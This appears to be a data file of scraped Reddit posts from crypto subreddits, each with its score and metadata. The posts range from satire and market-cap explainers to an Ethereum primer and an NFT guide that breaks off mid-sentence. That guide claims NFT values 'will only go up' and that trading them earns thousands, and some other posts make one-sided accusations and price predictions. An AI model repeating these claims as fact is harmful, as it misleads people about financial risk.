dips, moons and crashes, but probably should have sold. how many deloreans could i have bought? better not check my ""how many deloreans i can afford if i traded all of my cryptos for deloreans.xlsx"" spreadsheet. my heart and soul must be dead. i have felt no emotion or regret during the crash. 2013 had used up all of that. all of my colleagues are bored and stop talking about crypto. despite what they said, they weren't interested in the tech, only the money. one buys a folding phone for $1,500 with what was once $10k of galaxy ripple chocolate bars, i think. i buy more ether, deciding to not exchange any for other tokens. from now on, only btc and eth for me. i buy some occasionally, but not as much as i should. i pretty much leave crypto will the expectation that we'll just repeat it all again in a few years. it's 2021, things are batshit insane again. already?woopdedoo. everyone's talking to me about crypto. fgs. i just decided to try the real stock market where people cry over a 3% crash. everyone is jumping back in. what is defi and nft? are cryptokitties nft? is my kitty still alive? who knows. give it 5 years and there'll be a yet another new equivalent to shitcoins. bitcoin drops by $10k in january, i'm like, meh. i play with coinbase earn and shortly make a mint. it's the present: bitcoin drops another 10k in february, even though it's still higher than the last drop. i'm like, meh. everyone panics. for some reason i decide to write a 20 word reddit post and it turns into whatever the hell i'm writing now for whatever point i'm trying to make. something about not declaring it dead over a $10k drop when we're still up by $20k this year. it's mid 2021. bitconnect is back and they want your doge. bitcoin hits $80k but crashes by 20% down to $64k. the world is on fire and shit is hitting the cpu fan. it crashes by another $5k before hitting $85k. ether was $4k but now deemed dead because it's only $2k. soon it'll be $5k. elon tweeted about doge being the national currency of mars. it's a joke, but now doge is $42 and i remember that old exchange that vanished with probably $420,000,000 worth of my doge, and 50 ltc. twelve seconds later it's back to $0.10. everyone is mad because it is now only worth double of what it was worth yesterday, even though it is down from ,12 seconds ago. it's every other year from now until the end of eternity.. everything crashed by 50% overnight. now it costs me 250 satoshis or less for my latte. ether is $1^26 or something and no one knows what is happening anymore. the price went so high because 10 billion people on earth use it daily, either directly or because their car automatically pays for tolls on the ethereum network with that project from oaken innovations that hasn't been updated in years, that now no exchange can display it correctly or something. everyone is now an nzt or nft or pos or some other acronym. while i'm working, my phone earns me 0.2 glm, my fridge earns me 4 myst, my washing machine earns me a few e-doge, all while i process medical simulations and allow some family in china to access wikipedia without their government seeing. my family on mars send me some doge to keep me afloat. ripple is still being investigated by the sec while their owners siphon another $100m each year. the price of all cryptos goes 10x every other year but it's all dead when it drops 10-20%. it's the end of this post. i've no idea what's going on. has the crash reverted in the time that i've written this? how many deloreans worth of crypto have i lost today? how many deloreans worth of crypto have i gained since the start of the year? i look at the price of literally every crypto and see a 10% drop after an unlimited % gain since inception and several hundred percent just this year or so. its the end of the end of this post. i consider how to end it, but instead have two endings. things don't make sense. i consider changing the title to reflect my original intention of pointing out how a 10-20% drop is pretty much to be expected with crypto and that by looking at the bigger picture, you won't even see this dip on a chart next year. instead, i do whatever i am doing now. i give up and decide to post this so i can use the reddit app to check if anyone has posted anything meaningful about nucypher, even though i expect the usual pump posts.",10390,722,0.92,2021-02-23 14:10:37,web3,CryptoCurrency,bose25,False,6532.0

EXPLANATION: The recent crash was probably due to margin accounts having a cascading crash on Binance.,"degenerates on binance with up to 150x leverage (borrowing tethers to buy crypto) have been building up their margin account balances to big numbers, and when they make money, they double down, and build even bigger positions. because they're degenerates. but when the price dips below a certain point, some degenerates who have these margin accounts are suddenly below their maintenance limits, and they get liquidated. when they get liquidated, binance will sell your crypto for tether, and you are left with little to nothing. so what happened? crypto got sold, and tether got bought. because crypto got sold, the price drops, which triggers more accounts, who thought they were safe, to dip below their margin maintenance requirements. this creates a feedback cycle which basically ends in the liquidation of all the margin accounts. it all ends in a very fast, cascading crash like we just saw. the bad news is the price is lower, but there's a silver lining. the good news is the market is in a healthier position after this. most of the unsustainable degenerate margin accounts are probably gone. if we go up to $60k in the next week, it's not because of borrowing (as much). going forward, at least for the near term, another event like this is not very likely. the price we see right now could be thought of as being closer to the ""real"" price which we would have had without the degenerates. tldr: fuck binance and fuck the rest of the exchanges with 150x leverage bullshit edit: some people wanted more evidence to support this theory, so i suggest you look at the price differences between the exchanges (binance vs. coinbase, for instance) during the crash. you'll notice the exchange with leverage was significantly lower in price, which suggests bots were arbitraging coinbase down to match it. additionally, note the tether price during the crash, which went up to $1.05. &#x200b;",8709,1921,0.9,2021-04-17 23:59:15,web3,CryptoCurrency,Fragsworth,False,6002.799999999999

Don't!","**edit: read the post before you shill your sub-$1-coins, please, why does nobody do this today?** i always see these posts a lot, but for some reason more in the past few days: *""what are the best coins under $x?""* and sure, it looks like that makes sense - bitcoin (btc) is super expensive already, while a coin like bittorrent (btt) is available for less than one cent! if you buy some now and they become as expensive as bitcoin you will be rich! bitcoin also used to be cheap! right? lol, nah, wrong, obviously. the thing is: coin price doesn't matter. at all. because it is strongly affected by how many coins are in circulation. there are currently about 18,700,000 btc in circulation, there will never be more than 21,000,000. but there are 660,000,000,000 btt at the moment and there will be 990,000,000,000 at some point. the important figure is the market cap, which is **market cap = circulating supply x coin price** so, for example, for btc it would be 49,500 x 18,700,000, about 920 billion usd. so if we imagine bittorrent becoming just as big as bitcoin, how much would a single coin be worth? $1.38. so can't a single btt be worth thousands of dollars, like btc is? no, absolutely not. if 1 btt would be worth 49,500, as 1 btc currently is, its market cap once all the coins are in circulation would be almost 50,000,000,000,000,000. 50 quadrillion, or 50,000 trillion. the total amount of wealth in the world is about 300 trillion. **tl;dr:** coin price is not a good indicator how much a coin can still grow. check the market cap and compare it to other coins to see how much a coin would need to grow to be as big as another coin. [the coin perspective](https://thecoinperspective.com) is a great website to make these comparisons. also remember that you can buy fractions of a coin, like 0.001 btc and don't have to buy a whole one.",8758,1678,0.86,2021-05-15 11:08:46,web3,CryptoCurrency,_martinshkreli_,False,5934.6

"For the love of god, please learn what market caps are","i’m seeing so many people just not have any understanding of one of the most basic measurements of valuation. if you don’t know what “market cap” means and you’re trying to get in early on “moonshots,” i’m begging you to take 2 minutes to read. market capitalization is the total value of all members of an asset. just circulating supply * price. (edited note: worth mentioning that you should be using the average price over different platforms. that being said: if the platform you’re looking at shows a price that would imply a market cap in the quadrillions, then that does mean the price is too high there. even though the market cap calculated by that price wouldn’t be an accurate measurement of the combined value of the coin, it is a good indicator of whether or not it will actually be able to maintain that price. if it’s not an accurate price, arbitrage is going to correct the price soon enough.) what does it tell us? it lets us know how much ~~money~~ value is attributed to it, and how it compares to other coins. take shib for an example. it has a circulating supply of **400 trillion tokens,** so at its price of 0.003¢, it has a market cap of nearly $12 billion. that’s 1/5 of doge’s cap of $60b, and it is therefore already one of the largest cryptocurrencies out there. at 10¢, the market cap would be $40 trillion, double the us annual gdp. it will not hit 10¢. it will not hit 1¢z it will not hit 0.1¢. it might hit 0.01¢ because of how the market has been working lately, but those other targets are just mathematically far too high. (another edited note: when i say reach that price, i meant having a stable price that high on most/all trading platforms. thanks to those of you who corrected me on that) the creators want you to see all those zeros in front of the price and assume buying it would be “getting in early.” don’t let them fool you. you are not getting in early by buying a coin with a $12b market cap. you are almost certainly very very very late. dyor. please. edit: a lot of people are hung up on “how much money is in it.” i didn’t mean it in terms of principal investment, i meant it in terms of valuation. i have a lot of bat that i bought at 30 cents. i don’t value it as if it were the 30 cents per token that i bought it at, because i know i can just sell at the market price if i need to. the argument that it would crash if everyone tired to sell at once is fallacious. it’s valued at what it is and it isn’t crashing to nothing from everyone selling at once because people aren’t trying to all sell at once. they would rather have the bat than the $1.30. if they didn’t, they would have sold already. edit 2: think i came off wrong here. not a financial expert, that much is obvious. i know that things can crash from everyone selling, i was trying to say that everyone selling is because they value the coin’s value in fiat/btc/eth/whatever less than they do the coin. second, i know there are flaws in it, as it can’t be instantly converted. i’m not trying to make it out to be some perfect metric of value. my intentions here are solely to tell people that their millions of scamcoin that they bought for $10 probably is not going to make them a 9 figure crypto whale. edit 3: u/reachoutloud broke down problems with a lot of my points. if you’re interested in actually learning more, their [comment](https://reddit.com/r/cryptocurrency/comments/na0jwv/_/gxsrlqu/?context=1) would be a good start.",8735,1623,0.79,2021-05-11 12:09:10,web3,CryptoCurrency,nascraytia,False,5898.099999999999

[recently, they added a 2% btc allocation to their flagship all in one balanced / growth funds](https://www.investmentexecutive.com/news/products/fidelity-to-add-bitcoin-exposure-to-portfolio-funds/). these are mom and pop funds that are held mostly by conservative investors. its been around a year since el salvador announced their bitcoin law and around 6 months since it went active. in this period, they have allocated a small portion of their reserves towards btc. this is not a gamble, but a solid and well planned asset allocation strategy. meanwhile, they have already started mining btc and over time, this industry has the potential to add to their gdp. what did people think bitcoin/crypto adoption would be like, one fine day every country across the world will just start accepting btc out of the blue? just like that it would become legal tender without any struggle? these are small steps and it will be risky. nothing happened overnight, let alone moving from usd to a decentralised currency like bitcoin. its shameful that people here want adoption of btc and crypto, but the first time a large sovereign power has tried to adopt btc, the same people who want crypto adoption go out of their way to attack them with baseless allegations. > muhh adoption should be in accordance with my terms, otherwise its not adoption. these people are just privileged bottom feeders who want to enjoy success without any risks whatsoever.",8254,1275,0.91,2022-01-26 09:23:17,web3,CryptoCurrency,Set1Less,False,5471.5

""shadowy"" as it turns out she has also been getting paid by the banks she is supposed to regulate. and she is brining in regulation that kills decentralised competitors to banks, who have so far enjoyed near monopoly when it comes to controlling people's finances. as treasury secretary, she is paid by the us government to regulate banks - a role that requires the highest standards of ethics and moral turpitude. but she has collected $7m from the same banks that she regulates! including citi, citadel securities etc. how, without impartiality, can she regulate these banks that are paying her millions of dollars in speaking fees? &#x200b; [all the payments she received in 2020. all from home, due to lockdown. collecting millions from the entities she regulates. ](https://preview.redd.it/xffdoivz7zf71.jpg?width=952&format=pjpg&auto=webp&s=45e1e13fd61e6313fb748fed2beaa006ccad9d09) imo - public officials paid by the government should not be collecting millions from the same entities they regulate. this is nothing but grift. while it is not per se criminal, because she was doing it when she was not a govt official, but nevertheless these payments were received between her 2 terms as treasury secretary. the ethical thing for her was to not accept the role of treasury secretary in the new biden administration, because she was aware she had been paid by the banks she is supposed to regulate. but despite all this, she took up the job. clearly indicating her lack of morals and ethics. she really needs to step down. the crypto community must unite to get such greedy grifters out of public policy for good, if we need to have a fair chance at our decentralised future.",8338,1030,0.87,2021-08-08 07:39:17,web3,CryptoCurrency,Set1Less,False,5423.5

Reddit announces partnership with the Ethereum Foundation,"hello, ethereum world! reddit admin [u/jarins](https://www.reddit.com/u/jarins/) here, with some exciting news to share today: reddit has teamed up with the ethereum foundation to establish reddit’s first-ever blockchain partnership! as reddit continues to grow with more than 50 million daily users and hundreds of thousands of communities, the platform has long maintained a decentralized ethos by empowering users to create, govern, and grow their own communities. through this partnership, we will be increasing our commitment to blockchain, accelerating scaling and resources for the ethereum ecosystem, and bringing the value and independence of blockchain technology to millions of redditors. in many ways, this collaboration started with the [scaling bake-off](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/) that we hosted in this community with the ethereum foundation. in this new stage of our partnership, immediate efforts will be focused on bringing ethereum to reddit-scale production. our intention is to help accelerate the progress being made on scaling and develop the technology needed to launch large-scale applications like community points on ethereum. the scaling technology developed through this partnership will be open-sourced and publicly available for anyone to use. we introduced [community points](https://www.reddit.com/community-points/) last year to give more ownership and control back to users through decentralized technology. built on ethereum, community points represent a user’s ownership in a community and rewards them for their individual contributions (such as posts and comments). this project is our first attempt at utilizing decentralized technology to empower individuals to have a sense of accountability and more ownership in the communities that they create and contribute to. community points are currently in beta on the rinkeby network and are being tested in [r/cryptocurrency](https://www.reddit.com/r/cryptocurrency/) and [r/fortnitebr](https://www.reddit.com/r/fortnitebr/). our blockchain efforts will be led by reddit's crypto team (hi!). we are currently [hiring](https://boards.greenhouse.io/reddit/jobs/2413930) great backend engineers who want to build the decentralized internet. if you’re interested in solving tough problems like scaling and bringing blockchain to millions of users, send me a pm or apply directly on reddit’s careers page -- we’d love to talk to you! we’re looking forward to working closely with the ethereum foundation, and contributing more to the broader ethereum ecosystem -- and we hope to share some exciting announcements over the next few months. i'll be hanging around with a couple of folks from the ethereum foundation to answer questions. ask away!",7240,890,0.96,2021-01-27 14:15:02,web3,ethereum,jarins,False,4709.6

"PSA: Ethereum Classic (ETC) is a dead, insecure chain with no fundamental value","i'm seeing a lot of interest in ethereum classic lately, mostly from people relatively new to crypto. here are some facts. **= origins =** * in 2016, a major smart contract on ethereum with 14% of all extant eth locked up in it (the dao) suffered a hack (a bug with the smart contract, not a bug with ethereum) that resulted in much of the eth being stolen. the ethereum community was split on what to do, and eventually there was a [controversial hard fork](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-the-response-to-the-dao-hack). * the **hard forked** chain (with all the hacked eth put into a different, safe smart contract for withdrawal by its original owners) became today's **ethereum** chain. ethereum has not conducted any further chain-state-changing hard forks after that point. * the **unchanged** chain (with the attacker keeping the stolen funds) became **ethereum classic**. **= network effects and defi =** * the large majority of the ethereum community decided that ethereum was the legitimate chain. as a result, it has subsequently seen the vast majority of development and usage compared to ethereum classic, and all of the defi and other dapps we have come to know and love are built on ethereum, **not** ethereum classic. thousands of interconnected dapps exist on ethereum. * by comparison, almost no development has taken place on ethereum classic. developers want to go where all the other developers are, and that is *not* ethereum classic. **= security =** * ethereum is one of the most secure decentralized chains out there, along with bitcoin. * ethereum classic has a tiny fraction of the hash rate that ethereum does (under 2% until the past few days), leaving it vulnerable to 51% attacks, [four of which](https://www.coindesk.com/ethereum-classic-blockchain-subject-to-yet-another-51-attack) have happened so far. this is where an attacker buys or rents a bunch of hashpower, takes over the chain and executes invalid transactions for their own financial gain. it means the blockchain is fundamentally worthless (the entire point of a blockchain is to be trustlessly secure). these attacks were subsequently rolled back (ironically, given etc's founding principle of not changing what happens on-chain), but not before weeks of headaches and lost transactions. **= upgrades =** * ethereum has received regular hardforks over its history. these hardforks have added features to solidity (the programming language on both chains), fixed problems with the cryptoeconomic model, and improved user experience (ux), among many other changes. soon, ethereum will be transitioning to proof of stake, the most major upgrade since the chain was started. * ethereum classic has copied over some of these same hardforks from ethereum, but also has added others that have led to it diverging from ethereum. importantly, it will not be transitioning to proof of stake or reaping any of the benefits from the other set of upgrades that were formerly collectively termed ""eth2"". all of these reasons are why ethereum currently has a much higher market cap than ethereum classic, and as a result, a higher price per coin. they are **not** ""the same chain"". ethereum classic is **not** ""the same but cheaper"". ethereum has fantastic fundamentals, and ethereum classic has none. ""price go up"" is not a fundamental. do with that information what you will. p.s. for more, please see [this post](https://old.reddit.com/r/ethtrader/comments/n6ecr4/ethereum_classic_is_not_classic_and_it_is_not/) in r/ethtrader",3338,897,0.93,2021-05-06 18:59:48,web3,ethereum,interweaver,False,2370.9

r/Ethereum - I wrote this to explain Ethereum in depth to newbies. Please check for accuracy!,"hello r/ethereum - i'm currently in singapore exploring all of the cool blockchain tech that's going on here. i'm also writing a blog that aims to explain blockchain technology simply to anyone whose interested. www.cryptoambit.com if you guys could spot check my ethereum post for accuracy, i'd appreciate it. if you like it, would also appreciate some subscribers! thanks _____________________________________________ by now, most people know ethereum as the second most valuable cryptocurrency, currently valued at over $60 billion dollars. well, it turns out that ethereum isn't actually a cryptocurrency - it's a software platform that let's programmers build applications on top of blockchain technology. within the ethereum platform, is a cryptocurrency called ether that is used to power applications built on the ethereum blockchain. **from bitcoin to ethereum** bitcoin uses a global network of computers that maintain a shared ledger called a blockchain that keeps track of who owns bitcoin. once blockchain technology was introduced to the world, people realized that blockchains could be used to keep track of anything of value. in 2013, a 19 year old named vitalik buterin introduced the ethereum white paper, which proposed an open source platform that would let programmers build blockchain applications that could facilitate the exchange of money, content, property, shares or anything of value. much like with satoshi nakamoto's paper, buterin's was met with widespread excitement from software developers around the world who began building toward the vision buterin laid out. much like bitcoin, ethereum isn't owned or controlled by any one person. unlike bitcoin, whose creator remains anonymous, ethereum has a leader in vitalik buterin (pictured below). while buterin doesn't control ethereum in the way that a ceo does, his word carries tremendous weight in dictating the direction of the project - something that is considered a strength or a weakness, depending on who you ask. **smart contracts** the basic function that programs built on ethereum perform are called smart contracts. smart contracts are digital agreements that execute automatically based on real world data. an easy way to think of them is an ""if-then statement."" if condition a exists, then perform function b. let's say for example grandma wants to make sure she never forgets to give little billy birthday money each year. she could write a smart contract that says if it's little billy's birthday, then pay him $10 from grandma's account. once this contract is broadcast to the ethereum network, it will execute automatically each year on little billy's birthday. smart contracts have applications far beyond improving the reliability and efficiency of grandmothers around the world. another simple application of a smart contract is for rental payments: if date = 1st of the month, then pay landlord rent amount. processes that currently involve manual interactions between two parties can now be automated and the value can be moved in real time over the blockchain rather than settling days later as with traditional banking. **a real world example** ethereum and smart contracts are a big deal because they have the ability to usher in what's been dubbed the ""smart economy"" - one in which slow manual processes prone to human error and deceit are replaced with automated processes that are completely transparent and trustworthy. a real world example that typifies the new ""smart economy"" is a project being run by a french insurance company called axa. axa offers a flight insurance product that pays out a policy holder in the event that a flight is delayed by two hours or more. it currently has a product in trial that will pay out insurance claims using smart contracts and the ethereum blockchain. the smart contract is simple: if flight is over two hours late, then pay policyholder. the smart contract is connected to a database that monitors flight times. if the database shows that the flight is over two hours late, the smart contract is triggered and the policyholder is paid automatically over the blockchain. without the smart contract, the policyholder would have to file a claim and wait for the insurance company's claims department to process it, which could take anywhere from 1 to 2 weeks. with the smart contract, neither the insurance company nor the policyholder has to do anything. this also creates trust between the two parties because there are no grey areas - the customer can review the smart contract prior to purchasing the policy and feel comfortable that he will receive his claim in the event of a delay. **ethereum vs ether** as stated in the intro, ethereum is a platform for building blockchain applications using smart contracts. what you may have just purchased on coinbase is called ether, which is the cryptocurrency that fuels the ethereum network. ether functions more like a digital commodity than a digital currency. just like you need gasoline to fuel your car, you need ether to run applications on the ethereum blockchain. in the grandmother example cited above, grandma would have to purchase small amounts of ether to fuel her smart contract that pays little billy his birthday money. the ethereum blockchain functions in the same way as the bitcoin blockchain: a network of computers run software that validates transactions through majority consensus. the people running these computers are called miners. bitcoin miners are compensated for their resources by being paid in bitcoin. ethereum miners are compensated in ether. on little billy's birthday, grandma's ether transaction fee will go to whichever miner adds the block containing grandma's transaction to the blockchain. that miner will also receive new ether in the process. the same supply/demand economics that apply to commodities like oil and gas also apply to ether. oil is valuable because it powers many of the things we use in our everyday life - it heats our homes and fuels our engines. the more people and enterprises that rely on ethereum based applications, the higher the demand will be for ether which will increase its value. as with all cryptocurrencies, there's plenty of speculation baked into the price - speculation that the demand for ether will increase in the future. since ether is valuable, exchangeable and transferable, certain merchants are also starting to accept it as a currency. **dapps - decentralized apps** applications that run smart contracts on the ethereum blockchain are called ""dapps,"" or decentralized apps. just as any app developer can build apps on top of apple's ios operating system, developers can build on top of ethereum's blockchain infrastructure. to the end user of a dapp, it might not look and feel any different than the apps you use today. it's the underlying blockchain infrastructure that make them different. since dapps function on top of the blockchain, they can be used to transfer value peer-to-peer. to return to our grandmother example, there could be a dapp that granny can download that lets her schedule little billy's birthday payments without having to code the smart contract herself. dapps are also completely open sourced so other people can access the code and build on top of them. someone could take the code to the birthday payment dapp and add the ability for grandma to add a note that says, ""happy birthday billy!"" running dapps on the blockchain also offers added security benefits. since the transactions are distributed and encrypted across the ethereum blockchain, there is no central place for a hacker to breach and gain access to all of the world's grandmother to grandson birthday payment data. at this point, i'm really beating the grandmother/little billy example to death because i think it represents a simple illustration for the kinds of applications that can be built on the ethereum blockchain. in reality, the dapps that are being built are much more complex. here are a few examples: * **weifund - blockchain crowdfunding:** users can launch traditional crowdfunding campaigns, but through the use of smart contracts, backers can gain a financial stake in the project. if an indie film gets funded on weifund, a backer who financed 10% of the project can collect 10% of the film's revenues. payments will be issued in real time as the film generates revenue. * **ujo music - music licensing via the blockchain:** an artist can create an original song and register it on ujo's platform and set their own licensing terms. if a film producer wants to use that song in a movie, they can purchase the rights based on the terms set by the artist who will then get paid directly. this erases the need for industry middlemen like warner brothers who end up taking the lion's share of their artist's profits. * **virtue poker - online poker secured by the blockchain:** at the height of it's popularity, online poker platforms like pokerstars were marred with issues that ranged from deck rigging to the abuse of player funds held by the company. virtue poker using ethereum allows players to fund their bets directly, insuring that no central party can access and misappropriate player money. their code is open sourced so that users can understand how hands are dealt, insuring that no one can rig the deck. lastly, players are paid out their winnings in real time over the blockchain so no more waiting weeks for a check to come in the mail. **ethereum tokens** so now that you understand that ethereum is a network for building decentralized applications that require a cryptocurrency called ether to run, i'm going to introduce a confusing concept. many dapps built on ethereum have their own cryptocurrencies or ""tokens."" in order to interact with the dapps, customers need to purchase the dapp's native token. here's a helpful analogy i came across - when you go to a waterpark, you pay the admission fee and in return, you get a wristband. that wristband gives you the ability to ride the waterslides in the water park. with certain dapps, the token is the wristband, and a user must purchase it to interact with whatever the dapp offers. let's take a dapp called golem as an example. golem lets people rent out their excess computing power to people who need it - kind of like a computer airbnb. to cite this article from laura shin, if i'm a computer graphics artist that wants to render some kind of computationally intense animation, i can purchase golem tokens that let me tap into the golem network to generate my animation. i then pay the people who are renting me their computers with the golem tokens. the golem token is a form of smart contract and this transaction is recorded on the ethereum blockchain. since golem tokens are also a cryptocurrency, they can be traded on the free market. if i'm a speculator who has no intention of using the golem network to rent computing power, i can still buy the golem token on an exchange in hopes that it appreciates in value. like bitcoin, there is a fixed supply of golem tokens so if the demand for the service increases, so will the value of the token. if i bought golem at its original price of around 1 penny and held it to today, i would have made 35x my initial investment since golem tokens currently trade around 35 cents a piece. **icos** ico stands for, ""initial coin offering"" which is a fundraising mechanism for cryptocurrencies which has exploded in popularity this year - the majority of them are held on the ethereum network. similar to a kickstarter campaign, they allow entrepreneurs to raise money for projects by giving investors an early opportunity to purchase the cryptocurrency before the final product has been built. if the project is successful, the value of the cryptocurrency will rise in value and early investors can sell it on the open market for a profit. icos have stirred up a lot of controversy because they represent a risky proposition with zero investor protection. let's say i wanted to build a casino and to finance it, i gave investors the opportunity to buy chips that can be used at my roulette tables once the casino opened. if you bought $100k in roulette chips from me and i decide that i no longer want to build the casino, you're stuck holding worthless chips. if investors don't do their due diligence, they may end up buying tokens for a project whose creators never intended on building it in he first place - the creators walk away with the money and the investors have no way of recouping their funds. on the other hand, early investors in projects that go on to be successful have the opportunity to make enormous returns. for example, people who invested $1,000 in the golem ico would be sitting on $35,000 at it's current price of $0.35 - if it ever goes to $10, they're all millionaires. another positive aspect of icos is that they let anyone, rich or poor get involved in early stage investing. to invest in a company like twitter or facebook pre-ipo (initial public offering), you need to be an accredited investor - this basically means you're already a rich person. with icos, all you need is an internet connection and a little bit of money and you have the potential to become wealthy by investing in the right projects. **far from perfect** ethereum has the potential to change the way humans transact with one another but it is still a very young technology and it hasn't been without its problems. while the blockchain architecture underlying the ethereum network is secure, not all of the applications built on top of it are. faulty code can and has made applications vulnerable to hacking and malfunctions. here are two prime examples: **dao hack** - dao was a dapp built on ethereum that enabled crowd based venture capital. dao token holders were given the right to vote on projects they wanted to support - if projects went on to be successful, dao token holders would receive financial rewards. the dao ico received $168 million in funding. the dao software was hosted on the ethereum blockchain and was publically visible by all. a hacker spotted a flaw in the dao's code that enabled him to route $55m in ether held by the dao into an account that he controlled. the ethereum team had do do something called a hard fork (something i won't get into now) to reverse return the stolen funds. **parity wallet freeze** - parity is a wallet where people store ether. a flaw in parity's code let a user delete a specific line of code that was necessary for accessing funds in a parity wallet. this led to $280 million dollars worth of ether being frozen - it hasn't been stolen but it can't be accessed either. parity technologies has proposed another hard fork to correct the issue - something that is sure to divide the ethereum community and rattle user confidence. despite the world changing implications that ethereum dapps and smart contracts have, the trouble is that any programmer can write them - if they aren't written properly, they can behave in unintended ways and be exploited like in the above listed examples. ethereum is still a very young network and security issues with dapps and smart contracts will have to be sorted out if its to reach its true aspirations. **leading the decentralized revolution** “ethereum aims to take the promise of decentralization, openness and security that is at the core of blockchain technology and brings it to almost anything that can be computed.” - vitalik buterin with dapps, smart contracts and blockchain technology, ethereum is leading the decentralized revolution. bitcoin is the world's first decentralized currency, that operates on a global network of computers outside of central intermediaries. ethereum gives programmers a platform to develop a decentralized version of just about anything. decentralized networks like ethereum have the power to remove the intermediaries that currently exist between producer and consumer. let's take a company like uber. uber is a platform that brings people who need rides together with people who have cars. to facilitate this interaction, uber collects 20% of every ride. with ethereum and blockchain technology, there is nothing to prevent a bunch of software developers from writing a dapp that creates a decentralized uber. instead of 20% per ride, transaction fees are paid to the network and the driver takes home the lions share of the transaction. tokens can be issued that represent ownership in the network. coders who work on improving the network can get paid for their efforts in ownership tokens. non-technical people can come up with marketing campaigns that spread awareness for the network and also get compensated in ownership tokens. as the decentralized uber network grows and improves, the value of its ownership token increases, rewarding the people that built it. the result is whats referred to as a ""decentralized autonomous organization"" and theres a strong possibility that daos replace a lot of the world's biggest corporations. this may sound like a radical concept but blockchain technology enables these kinds of decentralized organizations to exist - ethereum provides the tools for people to go out and build them.",3702,282,0.95,2017-12-13 08:06:45,web3,ethereum,CryptigoVespucci,False,2343.5

Brace yourselves. People who think they can become millionaires with 1k investment are coming.,"you feel it in the air. as soon as bitcoin reaches mainstream news due to high price, they are coming here. newcomers, who have their first surplus after all the bills are paid and now think that crypto will go up 15% a week for another year or so.

What are NFTs? How to mint an NFT? Why are NFTs valuable? - Starting guide to NFTs,"**hello everyone, welcome to the world of nfts.** you may be new to blockchain and crypto, or you may have been in crypto for years at this point - but you in both cases - you probably are just now learning about nfts. this will be a guide that is ever living/changing to help introduce nfts, what gives them value and how you can get started in the nft space. ##what exactly is a non-fungible token or nft? a non-fungible token (nft) is a unique, individual token existing on a blockchain such as ethereum. unlike cryptocurrencies like bitcoin, each nft token contains unique data meaning non-fungible tokens are not interchangeable with each other. this non-fungible nature of the tokens means their use cases differ greatly from their fungible counterparts. a normal token can be exchanged for the same type of token equally without any difference. >a good example is a dollar - >if you and i both have a dollar — we can swap dollars and it doesn’t matter, neither of us lose out they are equal. whereas, with non-fungible tokens they are both >unique, meaning if we both have an nft, mine could be a baseball card, and yours could be your birth certificate — obviously we cannot exchange these two >equally. therefore making our tokens non-fungible. non-fungible tokens are used to create verifiable digital scarcity. nfts are used in several specific applications that require unique digital items. this has initially proven popular for blockchain games and collectibles like cryptokitties on the ethereum blockchain. nfts can also be used to represent in-game assets, which are in control of the user instead of the game developer. one exciting benefit of this arrangement means the non-fungible tokens or digital items, may actually outlive the game they were initially created for and find incorporate into separate future games. yet another potential use is in digital art, by helping prove authenticity and ownership. artwork is another example of how powerful nfts can be. by allowing artists to create artwork on the blockchain as nfts, it means their content now becomes sellable globally, on decentralized marketplaces. **providing a means to collect, earn, and make a living off crypto.** **nfts are one of the best ways to actually earn crypto over time, without needing to invest in it directly.** *(unlike scams that say the same thing, nfts are legit. its like opening a store on ebay or etsy, your trading your time and work for money).* ##what gives an nft its value? there are a ton of reasons to buy nfts. 1. **unique** - each nft is unique, its the only one of its kind. you cannot make another nft that is the same token number on the same smart contract. meaning there will only ever be one of that token. this is verified by the blockchain and can be seen by anyone. 2. **copyright** - your nft might come with copyright if you are using mintable.app. if the seller chooses to do so - it means that its on the blockchain that the owner of that token would have complete commercial copyright to use that image and asset. 3. **rare** - since they are unique and cannot be copied, they are rare. most of the time, there are very few nfts from an artist or seller - very rarely do they have 1000s of nfts. therefore, you can safely assume you would be one of the few people in the world that owns an collectible item, that can be resold. 4. **collectible** - these nfts/items are collectible. you can hold onto them, and their value will only go up in price since there are little ways to dilute the collection. buying them to resell them can earn you thousands of dollars. there are plenty of people who do it everyday and earn a living from it. 5. **downloadable** - if on mintable.app, only the current owner of the nft can download the file attached to it. making it unlockable to the owner. if your nft has something like, game assets, music, a pdf, or more locked inside it, you might want to buy the nft just to download that song/pdf/etc. 6. **immutable** - no one can change the metadata on the token, no one can remove your image, or the name of the token, etc. this means it will never change, it will never be removed, it cannot be taken down off the blockchain. this is what gives it so much value and collectibility 7. **forever** - nfts are forever. because the data doesn't change, and because the blockchain is forever, you will always have that token if you buy it. you can always resell that token if you want. its like buying a bar of gold - you own it, and you can do with it what you want. 8. **resellable** - you can always resell your nft. you should resell your nft and trade it. you can make some serious cash trading nfts. some nfts have gone for 20,000 usd + when the original buyer only bought it for a few thousand dollars. making them over 15,000 usd in a short time in one trade! **nfts are valuable** ##how do i get started with buying/trading nfts? you need eth and an ethereum wallet to get started. the most common is metamask.io - then you add some eth into that wallet. this is required by all sites in order to interact with an ethereum application. **step 2: find a marketplace.** the top nft marketplaces are currently: [mintable.app](https://mintable.app) [opensea](https://opensea.io) [superrare](https://superrare.co) [rarible](https://rarible.com) *there are more nft marketplaces but these are the leading open marketplaces, others may not be open to all nfts and only select items* some of these let you create your own nfts (if your a creator) and some of them are closed like superrare, where only approved artists can create items. below we will discuss creating nfts. ##how do i get started minting nfts? if you are a content creator, whether its artwork, graphic designs, 3d models, videos, pdf, research - it can all be turned into an nft using platforms like mintable.app. mintable is the most flexible and has the most possibilities so we will be using it and discussing how you can use it. *note: there are plenty of places to make nfts, but they either are: more expensive, have file size limits below 50mb, don't let you control your contracts, or do not offer decentralization.* ###minting on mintable.app on mintable you can sign up for an account and then its free to start minting nfts. you have three options to select from when you choose to mint: >1. your own store >2. mint in mintables store >3. gasless minting **your own store:** when you create your own store, you are making a smart contract on the blockchain - that you own, you control, your the only person who owns it. this is the preferred method for creating nfts but there is one single downside.... deploying a smart contract costs a ton if gas prices are above 50 gwei. around $100 initial investment to deploy the smart contract - but after that, you can mint hundreds of nfts for as little as $10 using mintable's batch minting. if you think of it as an 'operational cost' to get an online business going, $100 isn't that bad. but if your struggling to pay that - then you can mint under mintable's store, where everyone shares the contract and can mint nfts (that still are owned by you!) but don't need to worry about deploying your own store. when you create your store you can choose where the data is stored: **most flexible**: let mintable handle it **decentralized but no batch minting**: data is on ipfs **complete control**: your own servers or other locations you can pick *mintable is the only place that lets you pick where the data is stored, and so this is one of the big reasons people use it* **mintable's store** you save on transaction fees when you use mintable's store as you don't need to pay the initial overhead of deploying your own store to the blockchain. everyone can use mintable's store for free, and can mint thousands of nfts in a single transaction doing so. this is one of the reasons mintable.app is the most flexible platform for 